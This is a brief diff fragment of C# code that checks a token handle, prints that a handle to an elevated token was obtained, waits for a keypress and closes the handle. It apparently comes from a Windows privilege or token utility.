+            if (hToken == IntPtr.Zero)
+                return;
 
-                CloseHandle(hToken);
-            }
+            Console.WriteLine("[+] Got handle to the elevated token (hToken = 0x{0}).", hToken.ToString("X"));
+            Console.WriteLine("\n[*] To close the handle and exit this program, hit [ENTER] key.");
+            Console.ReadLine();
+
+            CloseHandle(hToken);
         }
     }
 }
